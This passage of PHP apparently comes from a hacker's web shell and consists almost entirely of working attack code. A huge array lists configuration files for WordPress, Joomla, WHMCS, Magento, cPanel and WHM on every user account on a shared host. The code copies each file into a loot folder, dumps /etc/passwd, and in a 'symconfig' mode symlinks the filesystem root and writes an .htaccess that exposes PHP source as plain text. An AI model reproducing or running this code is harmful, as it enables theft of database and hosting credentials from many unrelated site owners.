					"/home/$user_psy/public_html/JOOMLA/configuration.php" => "JoomlaJoomla",		
					"/home/$user_psy/public_html/Home/configuration.php" => "JoomlaHome",
					"/home/$user_psy/public_html/HOME/configuration.php" => "JoomlaHome",
					"/home/$user_psy/public_html/home/configuration.php" => "JoomlaHome",
					"/home/$user_psy/public_html/NEW/configuration.php" => "JoomlaNew",
					"/home/$user_psy/public_html/New/configuration.php" => "JoomlaNew",
					"/home/$user_psy/public_html/new/configuration.php" => "JoomlaNew",
					"/home/$user_psy/public_html/News/configuration.php" => "JoomlaNews",
					"/home/$user_psy/public_html/NEWS/configuration.php" => "JoomlaNews",
					"/home/$user_psy/public_html/news/configuration.php" => "JoomlaNews",
					"/home/$user_psy/public_html/Cms/configuration.php" => "JoomlaCms",
					"/home/$user_psy/public_html/CMS/configuration.php" => "JoomlaCms",
					"/home/$user_psy/public_html/cms/configuration.php" => "JoomlaCms",
					"/home/$user_psy/public_html/Main/configuration.php" => "JoomlaMain",
					"/home/$user_psy/public_html/MAIN/configuration.php" => "JoomlaMain",
					"/home/$user_psy/public_html/main/configuration.php" => "JoomlaMain",
					"/home/$user_psy/public_html/Blog/configuration.php" => "JoomlaBlog",
					"/home/$user_psy/public_html/BLOG/configuration.php" => "JoomlaBlog",
					"/home/$user_psy/public_html/blog/configuration.php" => "JoomlaBlog",
					"/home/$user_psy/public_html/Blogs/configuration.php" => "JoomlaBlogs",
					"/home/$user_psy/public_html/BLOGS/configuration.php" => "JoomlaBlogs",
					"/home/$user_psy/public_html/blogs/configuration.php" => "JoomlaBlogs",
					"/home/$user_psy/public_html/beta/configuration.php" => "JoomlaBeta",
					"/home/$user_psy/public_html/Beta/configuration.php" => "JoomlaBeta",
					"/home/$user_psy/public_html/BETA/configuration.php" => "JoomlaBeta",
					"/home/$user_psy/public_html/PRESS/configuration.php" => "JoomlaPress",
					"/home/$user_psy/public_html/Press/configuration.php" => "JoomlaPress",
					"/home/$user_psy/public_html/press/configuration.php" => "JoomlaPress",
					"/home/$user_psy/public_html/Wp/configuration.php" => "JoomlaWp",
					"/home/$user_psy/public_html/wp/configuration.php" => "JoomlaWp",
					"/home/$user_psy/public_html/WP/configuration.php" => "JoomlaWP",
					"/home/$user_psy/public_html/portal/configuration.php" => "JoomlaPortal",
					"/home/$user_psy/public_html/PORTAL/configuration.php" => "JoomlaPortal",
					"/home/$user_psy/public_html/Portal/configuration.php" => "JoomlaPortal",
					"/home/$user_psy/public_html/wp-config.php" => "WordPress",
					"/home/$user_psy/public_html/wordpress/wp-config.php" => "WordPressWordpress",
					"/home/$user_psy/public_html/Wordpress/wp-config.php" => "WordPressWordpress",
					"/home/$user_psy/public_html/WORDPRESS/wp-config.php" => "WordPressWordpress",		
					"/home/$user_psy/public_html/Home/wp-config.php" => "WordPressHome",
					"/home/$user_psy/public_html/HOME/wp-config.php" => "WordPressHome",
					"/home/$user_psy/public_html/home/wp-config.php" => "WordPressHome",
					"/home/$user_psy/public_html/NEW/wp-config.php" => "WordPressNew",
					"/home/$user_psy/public_html/New/wp-config.php" => "WordPressNew",
					"/home/$user_psy/public_html/new/wp-config.php" => "WordPressNew",
					"/home/$user_psy/public_html/News/wp-config.php" => "WordPressNews",
					"/home/$user_psy/public_html/NEWS/wp-config.php" => "WordPressNews",
					"/home/$user_psy/public_html/news/wp-config.php" => "WordPressNews",
					"/home/$user_psy/public_html/Cms/wp-config.php" => "WordPressCms",
					"/home/$user_psy/public_html/CMS/wp-config.php" => "WordPressCms",
					"/home/$user_psy/public_html/cms/wp-config.php" => "WordPressCms",
					"/home/$user_psy/public_html/Main/wp-config.php" => "WordPressMain",
					"/home/$user_psy/public_html/MAIN/wp-config.php" => "WordPressMain",
					"/home/$user_psy/public_html/main/wp-config.php" => "WordPressMain",
					"/home/$user_psy/public_html/Blog/wp-config.php" => "WordPressBlog",
					"/home/$user_psy/public_html/BLOG/wp-config.php" => "WordPressBlog",
					"/home/$user_psy/public_html/blog/wp-config.php" => "WordPressBlog",
					"/home/$user_psy/public_html/Blogs/wp-config.php" => "WordPressBlogs",
					"/home/$user_psy/public_html/BLOGS/wp-config.php" => "WordPressBlogs",
					"/home/$user_psy/public_html/blogs/wp-config.php" => "WordPressBlogs",
					"/home/$user_psy/public_html/beta/wp-config.php" => "WordPressBeta",
					"/home/$user_psy/public_html/Beta/wp-config.php" => "WordPressBeta",
					"/home/$user_psy/public_html/BETA/wp-config.php" => "WordPressBeta",
					"/home/$user_psy/public_html/PRESS/wp-config.php" => "WordPressPress",
					"/home/$user_psy/public_html/Press/wp-config.php" => "WordPressPress",
					"/home/$user_psy/public_html/press/wp-config.php" => "WordPressPress",
					"/home/$user_psy/public_html/Wp/wp-config.php" => "WordPressWp",
					"/home/$user_psy/public_html/wp/wp-config.php" => "WordPressWp",
					"/home/$user_psy/public_html/WP/wp-config.php" => "WordPressWP",
					"/home/$user_psy/public_html/portal/wp-config.php" => "WordPressPortal",
					"/home/$user_psy/public_html/PORTAL/wp-config.php" => "WordPressPortal",
					"/home/$user_psy/public_html/Portal/wp-config.php" => "WordPressPortal",
					"/home1/$user_psy/.my.cnf" => "cpanel",
					"/home1/$user_psy/.accesshash" => "WHM-accesshash",
					"/home1/$user_psy/public_html/bw-configs/config.ini" => "BosWeb",
					"/home1/$user_psy/public_html/config/koneksi.php" => "Lokomedia",
					"/home1/$user_psy/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home1/$user_psy/public_html/clientarea/configuration.php" => "WHMCS",
					"/home1/$user_psy/public_html/whmcs/configuration.php" => "WHMCS",
					"/home1/$user_psy/public_html/forum/config.php" => "phpBB",
					"/home1/$user_psy/public_html/sites/default/settings.php" => "Drupal",
					"/home1/$user_psy/public_html/config/settings.inc.php" => "PrestaShop",
					"/home1/$user_psy/public_html/app/etc/local.xml" => "Magento",
					"/home1/$user_psy/public_html/admin/config.php" => "OpenCart",
					"/home1/$user_psy/public_html/slconfig.php" => "Sitelok",
					"/home1/$user_psy/public_html/application/config/database.php" => "Ellislab",
					"/home1/$user_psy/public_html/whm/configuration.php" => "WHMCS",
					"/home1/$user_psy/public_html/whmc/WHM/configuration.ph" => "WHMC",
					"/home1/$user_psy/public_html/central/configuration.php" => "WHM Central",
					"/home1/$user_psy/public_html/whm/WHMCS/configuration.php" => "WHMCS",
					"/home1/$user_psy/public_html/whm/whmcs/configuration.php" => "WHMCS",
					"/home1/$user_psy/public_html/submitticket.php" => "WHMCS",
					"/home1/$user_psy/public_html/configuration.php" => "Joomla",					
					"/home1/$user_psy/public_html/Joomla/configuration.php" => "JoomlaJoomla",
					"/home1/$user_psy/public_html/joomla/configuration.php" => "JoomlaJoomla",
					"/home1/$user_psy/public_html/JOOMLA/configuration.php" => "JoomlaJoomla",		
					"/home1/$user_psy/public_html/Home/configuration.php" => "JoomlaHome",
					"/home1/$user_psy/public_html/HOME/configuration.php" => "JoomlaHome",
					"/home1/$user_psy/public_html/home/configuration.php" => "JoomlaHome",
					"/home1/$user_psy/public_html/NEW/configuration.php" => "JoomlaNew",
					"/home1/$user_psy/public_html/New/configuration.php" => "JoomlaNew",
					"/home1/$user_psy/public_html/new/configuration.php" => "JoomlaNew",
					"/home1/$user_psy/public_html/News/configuration.php" => "JoomlaNews",
					"/home1/$user_psy/public_html/NEWS/configuration.php" => "JoomlaNews",
					"/home1/$user_psy/public_html/news/configuration.php" => "JoomlaNews",
					"/home1/$user_psy/public_html/Cms/configuration.php" => "JoomlaCms",
					"/home1/$user_psy/public_html/CMS/configuration.php" => "JoomlaCms",
					"/home1/$user_psy/public_html/cms/configuration.php" => "JoomlaCms",
					"/home1/$user_psy/public_html/Main/configuration.php" => "JoomlaMain",
					"/home1/$user_psy/public_html/MAIN/configuration.php" => "JoomlaMain",
					"/home1/$user_psy/public_html/main/configuration.php" => "JoomlaMain",
					"/home1/$user_psy/public_html/Blog/configuration.php" => "JoomlaBlog",
					"/home1/$user_psy/public_html/BLOG/configuration.php" => "JoomlaBlog",
					"/home1/$user_psy/public_html/blog/configuration.php" => "JoomlaBlog",
					"/home1/$user_psy/public_html/Blogs/configuration.php" => "JoomlaBlogs",
					"/home1/$user_psy/public_html/BLOGS/configuration.php" => "JoomlaBlogs",
					"/home1/$user_psy/public_html/blogs/configuration.php" => "JoomlaBlogs",
					"/home1/$user_psy/public_html/beta/configuration.php" => "JoomlaBeta",
					"/home1/$user_psy/public_html/Beta/configuration.php" => "JoomlaBeta",
					"/home1/$user_psy/public_html/BETA/configuration.php" => "JoomlaBeta",
					"/home1/$user_psy/public_html/PRESS/configuration.php" => "JoomlaPress",
					"/home1/$user_psy/public_html/Press/configuration.php" => "JoomlaPress",
					"/home1/$user_psy/public_html/press/configuration.php" => "JoomlaPress",
					"/home1/$user_psy/public_html/Wp/configuration.php" => "JoomlaWp",
					"/home1/$user_psy/public_html/wp/configuration.php" => "JoomlaWp",
					"/home1/$user_psy/public_html/WP/configuration.php" => "JoomlaWP",
					"/home1/$user_psy/public_html/portal/configuration.php" => "JoomlaPortal",
					"/home1/$user_psy/public_html/PORTAL/configuration.php" => "JoomlaPortal",
					"/home1/$user_psy/public_html/Portal/configuration.php" => "JoomlaPortal",
					"/home1/$user_psy/public_html/wp-config.php" => "WordPress",
					"/home1/$user_psy/public_html/wordpress/wp-config.php" => "WordPressWordpress",
					"/home1/$user_psy/public_html/Wordpress/wp-config.php" => "WordPressWordpress",
					"/home1/$user_psy/public_html/WORDPRESS/wp-config.php" => "WordPressWordpress",		
					"/home1/$user_psy/public_html/Home/wp-config.php" => "WordPressHome",
					"/home1/$user_psy/public_html/HOME/wp-config.php" => "WordPressHome",
					"/home1/$user_psy/public_html/home/wp-config.php" => "WordPressHome",
					"/home1/$user_psy/public_html/NEW/wp-config.php" => "WordPressNew",
					"/home1/$user_psy/public_html/New/wp-config.php" => "WordPressNew",
					"/home1/$user_psy/public_html/new/wp-config.php" => "WordPressNew",
					"/home1/$user_psy/public_html/News/wp-config.php" => "WordPressNews",
					"/home1/$user_psy/public_html/NEWS/wp-config.php" => "WordPressNews",
					"/home1/$user_psy/public_html/news/wp-config.php" => "WordPressNews",
					"/home1/$user_psy/public_html/Cms/wp-config.php" => "WordPressCms",
					"/home1/$user_psy/public_html/CMS/wp-config.php" => "WordPressCms",
					"/home1/$user_psy/public_html/cms/wp-config.php" => "WordPressCms",
					"/home1/$user_psy/public_html/Main/wp-config.php" => "WordPressMain",
					"/home1/$user_psy/public_html/MAIN/wp-config.php" => "WordPressMain",
					"/home1/$user_psy/public_html/main/wp-config.php" => "WordPressMain",
					"/home1/$user_psy/public_html/Blog/wp-config.php" => "WordPressBlog",
					"/home1/$user_psy/public_html/BLOG/wp-config.php" => "WordPressBlog",
					"/home1/$user_psy/public_html/blog/wp-config.php" => "WordPressBlog",
					"/home1/$user_psy/public_html/Blogs/wp-config.php" => "WordPressBlogs",
					"/home1/$user_psy/public_html/BLOGS/wp-config.php" => "WordPressBlogs",
					"/home1/$user_psy/public_html/blogs/wp-config.php" => "WordPressBlogs",
					"/home1/$user_psy/public_html/beta/wp-config.php" => "WordPressBeta",
					"/home1/$user_psy/public_html/Beta/wp-config.php" => "WordPressBeta",
					"/home1/$user_psy/public_html/BETA/wp-config.php" => "WordPressBeta",
					"/home1/$user_psy/public_html/PRESS/wp-config.php" => "WordPressPress",
					"/home1/$user_psy/public_html/Press/wp-config.php" => "WordPressPress",
					"/home1/$user_psy/public_html/press/wp-config.php" => "WordPressPress",
					"/home1/$user_psy/public_html/Wp/wp-config.php" => "WordPressWp",
					"/home1/$user_psy/public_html/wp/wp-config.php" => "WordPressWp",
					"/home1/$user_psy/public_html/WP/wp-config.php" => "WordPressWP",
					"/home1/$user_psy/public_html/portal/wp-config.php" => "WordPressPortal",
					"/home1/$user_psy/public_html/PORTAL/wp-config.php" => "WordPressPortal",
					"/home1/$user_psy/public_html/Portal/wp-config.php" => "WordPressPortal",
					"/home2/$user_psy/.my.cnf" => "cpanel",
					"/home2/$user_psy/.accesshash" => "WHM-accesshash",
					"/home2/$user_psy/public_html/bw-configs/config.ini" => "BosWeb",
					"/home2/$user_psy/public_html/config/koneksi.php" => "Lokomedia",
					"/home2/$user_psy/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home2/$user_psy/public_html/clientarea/configuration.php" => "WHMCS",				
					"/home2/$user_psy/public_html/whmcs/configuration.php" => "WHMCS",
					"/home2/$user_psy/public_html/forum/config.php" => "phpBB",
					"/home2/$user_psy/public_html/sites/default/settings.php" => "Drupal",
					"/home2/$user_psy/public_html/config/settings.inc.php" => "PrestaShop",
					"/home2/$user_psy/public_html/app/etc/local.xml" => "Magento",
					"/home2/$user_psy/public_html/admin/config.php" => "OpenCart",
					"/home2/$user_psy/public_html/slconfig.php" => "Sitelok",
					"/home2/$user_psy/public_html/application/config/database.php" => "Ellislab",
					"/home2/$user_psy/public_html/whm/configuration.php" => "WHMCS",
					"/home2/$user_psy/public_html/whmc/WHM/configuration.ph" => "WHMC",
					"/home2/$user_psy/public_html/central/configuration.php" => "WHM Central",
					"/home2/$user_psy/public_html/whm/WHMCS/configuration.php" => "WHMCS",
					"/home2/$user_psy/public_html/whm/whmcs/configuration.php" => "WHMCS",
					"/home2/$user_psy/public_html/submitticket.php" => "WHMCS",
					"/home2/$user_psy/public_html/configuration.php" => "Joomla",					
					"/home2/$user_psy/public_html/Joomla/configuration.php" => "JoomlaJoomla",
					"/home2/$user_psy/public_html/joomla/configuration.php" => "JoomlaJoomla",
					"/home2/$user_psy/public_html/JOOMLA/configuration.php" => "JoomlaJoomla",		
					"/home2/$user_psy/public_html/Home/configuration.php" => "JoomlaHome",
					"/home2/$user_psy/public_html/HOME/configuration.php" => "JoomlaHome",
					"/home2/$user_psy/public_html/home/configuration.php" => "JoomlaHome",
					"/home2/$user_psy/public_html/NEW/configuration.php" => "JoomlaNew",
					"/home2/$user_psy/public_html/New/configuration.php" => "JoomlaNew",
					"/home2/$user_psy/public_html/new/configuration.php" => "JoomlaNew",
					"/home2/$user_psy/public_html/News/configuration.php" => "JoomlaNews",
					"/home2/$user_psy/public_html/NEWS/configuration.php" => "JoomlaNews",
					"/home2/$user_psy/public_html/news/configuration.php" => "JoomlaNews",
					"/home2/$user_psy/public_html/Cms/configuration.php" => "JoomlaCms",
					"/home2/$user_psy/public_html/CMS/configuration.php" => "JoomlaCms",
					"/home2/$user_psy/public_html/cms/configuration.php" => "JoomlaCms",
					"/home2/$user_psy/public_html/Main/configuration.php" => "JoomlaMain",
					"/home2/$user_psy/public_html/MAIN/configuration.php" => "JoomlaMain",
					"/home2/$user_psy/public_html/main/configuration.php" => "JoomlaMain",
					"/home2/$user_psy/public_html/Blog/configuration.php" => "JoomlaBlog",
					"/home2/$user_psy/public_html/BLOG/configuration.php" => "JoomlaBlog",
					"/home2/$user_psy/public_html/blog/configuration.php" => "JoomlaBlog",
					"/home2/$user_psy/public_html/Blogs/configuration.php" => "JoomlaBlogs",
					"/home2/$user_psy/public_html/BLOGS/configuration.php" => "JoomlaBlogs",
					"/home2/$user_psy/public_html/blogs/configuration.php" => "JoomlaBlogs",
					"/home2/$user_psy/public_html/beta/configuration.php" => "JoomlaBeta",
					"/home2/$user_psy/public_html/Beta/configuration.php" => "JoomlaBeta",
					"/home2/$user_psy/public_html/BETA/configuration.php" => "JoomlaBeta",
					"/home2/$user_psy/public_html/PRESS/configuration.php" => "JoomlaPress",
					"/home2/$user_psy/public_html/Press/configuration.php" => "JoomlaPress",
					"/home2/$user_psy/public_html/press/configuration.php" => "JoomlaPress",
					"/home2/$user_psy/public_html/Wp/configuration.php" => "JoomlaWp",
					"/home2/$user_psy/public_html/wp/configuration.php" => "JoomlaWp",
					"/home2/$user_psy/public_html/WP/configuration.php" => "JoomlaWP",
					"/home2/$user_psy/public_html/portal/configuration.php" => "JoomlaPortal",
					"/home2/$user_psy/public_html/PORTAL/configuration.php" => "JoomlaPortal",
					"/home2/$user_psy/public_html/Portal/configuration.php" => "JoomlaPortal",
					"/home2/$user_psy/public_html/wp-config.php" => "WordPress",
					"/home2/$user_psy/public_html/wordpress/wp-config.php" => "WordPressWordpress",
					"/home2/$user_psy/public_html/Wordpress/wp-config.php" => "WordPressWordpress",
					"/home2/$user_psy/public_html/WORDPRESS/wp-config.php" => "WordPressWordpress",		
					"/home2/$user_psy/public_html/Home/wp-config.php" => "WordPressHome",
					"/home2/$user_psy/public_html/HOME/wp-config.php" => "WordPressHome",
					"/home2/$user_psy/public_html/home/wp-config.php" => "WordPressHome",
					"/home2/$user_psy/public_html/NEW/wp-config.php" => "WordPressNew",
					"/home2/$user_psy/public_html/New/wp-config.php" => "WordPressNew",
					"/home2/$user_psy/public_html/new/wp-config.php" => "WordPressNew",
					"/home2/$user_psy/public_html/News/wp-config.php" => "WordPressNews",
					"/home2/$user_psy/public_html/NEWS/wp-config.php" => "WordPressNews",
					"/home2/$user_psy/public_html/news/wp-config.php" => "WordPressNews",
					"/home2/$user_psy/public_html/Cms/wp-config.php" => "WordPressCms",
					"/home2/$user_psy/public_html/CMS/wp-config.php" => "WordPressCms",
					"/home2/$user_psy/public_html/cms/wp-config.php" => "WordPressCms",
					"/home2/$user_psy/public_html/Main/wp-config.php" => "WordPressMain",
					"/home2/$user_psy/public_html/MAIN/wp-config.php" => "WordPressMain",
					"/home2/$user_psy/public_html/main/wp-config.php" => "WordPressMain",
					"/home2/$user_psy/public_html/Blog/wp-config.php" => "WordPressBlog",
					"/home2/$user_psy/public_html/BLOG/wp-config.php" => "WordPressBlog",
					"/home2/$user_psy/public_html/blog/wp-config.php" => "WordPressBlog",
					"/home2/$user_psy/public_html/Blogs/wp-config.php" => "WordPressBlogs",
					"/home2/$user_psy/public_html/BLOGS/wp-config.php" => "WordPressBlogs",
					"/home2/$user_psy/public_html/blogs/wp-config.php" => "WordPressBlogs",
					"/home2/$user_psy/public_html/beta/wp-config.php" => "WordPressBeta",
					"/home2/$user_psy/public_html/Beta/wp-config.php" => "WordPressBeta",
					"/home2/$user_psy/public_html/BETA/wp-config.php" => "WordPressBeta",
					"/home2/$user_psy/public_html/PRESS/wp-config.php" => "WordPressPress",
					"/home2/$user_psy/public_html/Press/wp-config.php" => "WordPressPress",
					"/home2/$user_psy/public_html/press/wp-config.php" => "WordPressPress",
					"/home2/$user_psy/public_html/Wp/wp-config.php" => "WordPressWp",
					"/home2/$user_psy/public_html/wp/wp-config.php" => "WordPressWp",
					"/home2/$user_psy/public_html/WP/wp-config.php" => "WordPressWP",
					"/home2/$user_psy/public_html/portal/wp-config.php" => "WordPressPortal",
					"/home2/$user_psy/public_html/PORTAL/wp-config.php" => "WordPressPortal",
					"/home2/$user_psy/public_html/Portal/wp-config.php" => "WordPressPortal",
					"/home3/$user_psy/.my.cnf" => "cpanel",
					"/home3/$user_psy/.accesshash" => "WHM-accesshash",
					"/home3/$user_psy/public_html/bw-configs/config.ini" => "BosWeb",
					"/home3/$user_psy/public_html/config/koneksi.php" => "Lokomedia",
					"/home3/$user_psy/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home3/$user_psy/public_html/clientarea/configuration.php" => "WHMCS",				
					"/home3/$user_psy/public_html/whmcs/configuration.php" => "WHMCS",
					"/home3/$user_psy/public_html/forum/config.php" => "phpBB",
					"/home3/$user_psy/public_html/sites/default/settings.php" => "Drupal",
					"/home3/$user_psy/public_html/config/settings.inc.php" => "PrestaShop",
					"/home3/$user_psy/public_html/app/etc/local.xml" => "Magento",
					"/home3/$user_psy/public_html/admin/config.php" => "OpenCart",
					"/home3/$user_psy/public_html/slconfig.php" => "Sitelok",
					"/home3/$user_psy/public_html/application/config/database.php" => "Ellislab",
					"/home3/$user_psy/public_html/whm/configuration.php" => "WHMCS",
					"/home3/$user_psy/public_html/whmc/WHM/configuration.ph" => "WHMC",
					"/home3/$user_psy/public_html/central/configuration.php" => "WHM Central",
					"/home3/$user_psy/public_html/whm/WHMCS/configuration.php" => "WHMCS",
					"/home3/$user_psy/public_html/whm/whmcs/configuration.php" => "WHMCS",
					"/home3/$user_psy/public_html/submitticket.php" => "WHMCS",
					"/home3/$user_psy/public_html/configuration.php" => "Joomla",					
					"/home3/$user_psy/public_html/Joomla/configuration.php" => "JoomlaJoomla",
					"/home3/$user_psy/public_html/joomla/configuration.php" => "JoomlaJoomla",
					"/home3/$user_psy/public_html/JOOMLA/configuration.php" => "JoomlaJoomla",		
					"/home3/$user_psy/public_html/Home/configuration.php" => "JoomlaHome",
					"/home3/$user_psy/public_html/HOME/configuration.php" => "JoomlaHome",
					"/home3/$user_psy/public_html/home/configuration.php" => "JoomlaHome",
					"/home3/$user_psy/public_html/NEW/configuration.php" => "JoomlaNew",
					"/home3/$user_psy/public_html/New/configuration.php" => "JoomlaNew",
					"/home3/$user_psy/public_html/new/configuration.php" => "JoomlaNew",
					"/home3/$user_psy/public_html/News/configuration.php" => "JoomlaNews",
					"/home3/$user_psy/public_html/NEWS/configuration.php" => "JoomlaNews",
					"/home3/$user_psy/public_html/news/configuration.php" => "JoomlaNews",
					"/home3/$user_psy/public_html/Cms/configuration.php" => "JoomlaCms",
					"/home3/$user_psy/public_html/CMS/configuration.php" => "JoomlaCms",
					"/home3/$user_psy/public_html/cms/configuration.php" => "JoomlaCms",
					"/home3/$user_psy/public_html/Main/configuration.php" => "JoomlaMain",
					"/home3/$user_psy/public_html/MAIN/configuration.php" => "JoomlaMain",
					"/home3/$user_psy/public_html/main/configuration.php" => "JoomlaMain",
					"/home3/$user_psy/public_html/Blog/configuration.php" => "JoomlaBlog",
					"/home3/$user_psy/public_html/BLOG/configuration.php" => "JoomlaBlog",
					"/home3/$user_psy/public_html/blog/configuration.php" => "JoomlaBlog",
					"/home3/$user_psy/public_html/Blogs/configuration.php" => "JoomlaBlogs",
					"/home3/$user_psy/public_html/BLOGS/configuration.php" => "JoomlaBlogs",
					"/home3/$user_psy/public_html/blogs/configuration.php" => "JoomlaBlogs",
					"/home3/$user_psy/public_html/beta/configuration.php" => "JoomlaBeta",
					"/home3/$user_psy/public_html/Beta/configuration.php" => "JoomlaBeta",
					"/home3/$user_psy/public_html/BETA/configuration.php" => "JoomlaBeta",
					"/home3/$user_psy/public_html/PRESS/configuration.php" => "JoomlaPress",
					"/home3/$user_psy/public_html/Press/configuration.php" => "JoomlaPress",
					"/home3/$user_psy/public_html/press/configuration.php" => "JoomlaPress",
					"/home3/$user_psy/public_html/Wp/configuration.php" => "JoomlaWp",
					"/home3/$user_psy/public_html/wp/configuration.php" => "JoomlaWp",
					"/home3/$user_psy/public_html/WP/configuration.php" => "JoomlaWP",
					"/home3/$user_psy/public_html/portal/configuration.php" => "JoomlaPortal",
					"/home3/$user_psy/public_html/PORTAL/configuration.php" => "JoomlaPortal",
					"/home3/$user_psy/public_html/Portal/configuration.php" => "JoomlaPortal",
					"/home3/$user_psy/public_html/wp-config.php" => "WordPress",
					"/home3/$user_psy/public_html/wordpress/wp-config.php" => "WordPressWordpress",
					"/home3/$user_psy/public_html/Wordpress/wp-config.php" => "WordPressWordpress",
					"/home3/$user_psy/public_html/WORDPRESS/wp-config.php" => "WordPressWordpress",		
					"/home3/$user_psy/public_html/Home/wp-config.php" => "WordPressHome",
					"/home3/$user_psy/public_html/HOME/wp-config.php" => "WordPressHome",
					"/home3/$user_psy/public_html/home/wp-config.php" => "WordPressHome",
					"/home3/$user_psy/public_html/NEW/wp-config.php" => "WordPressNew",
					"/home3/$user_psy/public_html/New/wp-config.php" => "WordPressNew",
					"/home3/$user_psy/public_html/new/wp-config.php" => "WordPressNew",
					"/home3/$user_psy/public_html/News/wp-config.php" => "WordPressNews",
					"/home3/$user_psy/public_html/NEWS/wp-config.php" => "WordPressNews",
					"/home3/$user_psy/public_html/news/wp-config.php" => "WordPressNews",
					"/home3/$user_psy/public_html/Cms/wp-config.php" => "WordPressCms",
					"/home3/$user_psy/public_html/CMS/wp-config.php" => "WordPressCms",
					"/home3/$user_psy/public_html/cms/wp-config.php" => "WordPressCms",
					"/home3/$user_psy/public_html/Main/wp-config.php" => "WordPressMain",
					"/home3/$user_psy/public_html/MAIN/wp-config.php" => "WordPressMain",
					"/home3/$user_psy/public_html/main/wp-config.php" => "WordPressMain",
					"/home3/$user_psy/public_html/Blog/wp-config.php" => "WordPressBlog",
					"/home3/$user_psy/public_html/BLOG/wp-config.php" => "WordPressBlog",
					"/home3/$user_psy/public_html/blog/wp-config.php" => "WordPressBlog",
					"/home3/$user_psy/public_html/Blogs/wp-config.php" => "WordPressBlogs",
					"/home3/$user_psy/public_html/BLOGS/wp-config.php" => "WordPressBlogs",
					"/home3/$user_psy/public_html/blogs/wp-config.php" => "WordPressBlogs",
					"/home3/$user_psy/public_html/beta/wp-config.php" => "WordPressBeta",
					"/home3/$user_psy/public_html/Beta/wp-config.php" => "WordPressBeta",
					"/home3/$user_psy/public_html/BETA/wp-config.php" => "WordPressBeta",
					"/home3/$user_psy/public_html/PRESS/wp-config.php" => "WordPressPress",
					"/home3/$user_psy/public_html/Press/wp-config.php" => "WordPressPress",
					"/home3/$user_psy/public_html/press/wp-config.php" => "WordPressPress",
					"/home3/$user_psy/public_html/Wp/wp-config.php" => "WordPressWp",
					"/home3/$user_psy/public_html/wp/wp-config.php" => "WordPressWp",
					"/home3/$user_psy/public_html/WP/wp-config.php" => "WordPressWP",
					"/home3/$user_psy/public_html/portal/wp-config.php" => "WordPressPortal",
					"/home3/$user_psy/public_html/PORTAL/wp-config.php" => "WordPressPortal",
					"/home3/$user_psy/public_html/Portal/wp-config.php" => "WordPressPortal"
						);	
					foreach($grab_config as $config => $nama_config) {
						$ambil_config = file_get_contents($config);
						if($ambil_config == '') {
						} else {
							$file_config = fopen("P5yc0_config1/$user_psy-$nama_config.txt","w");
							fputs($file_config,$ambil_config);
						}
					}
				}		
			}
			echo "<center><a href='?dir=$dir/m1x_config1'><font color=aqua>Done</font></a></center>";
			}else{
				
		echo "<form method=\"post\" action=\"\"><center>/etc/passwd/ ( Error ? <a href='?dir=$dir&do=passwbypass'>Bypass Here</a> )<br><textarea name=\"passwd\" class='area' rows='15' cols='60'>\n";
		echo file_get_contents('/etc/passwd'); 
		echo "</textarea><br><input type=\"submit\" value=\"GassPoll\"></td></tr></center>\n";
        }
}
elseif($_GET['do'] == 'symconfig') {
if(strtolower(substr(PHP_OS, 0, 3)) == "win"){
echo '<script>alert("Skid this won\'t work on Windows")</script>';
exit;
}
else
{
if($_POST["m"] && !$_POST["passwd"]==""){
@mkdir("P5yc0_config2", 0777);
@chdir("P5yc0_config2");
@symlink("/","root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex psy.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any";
@file_put_contents(".htaccess",$htaccess);
$etc_passwd=$_POST["passwd"];
$etc_passwd=explode("\n",$etc_passwd);
foreach($etc_passwd as $passwd){
$pawd=explode(":",$passwd);
$user =$pawd[0];
@symlink('/','P5yc0_config2/root');
@symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
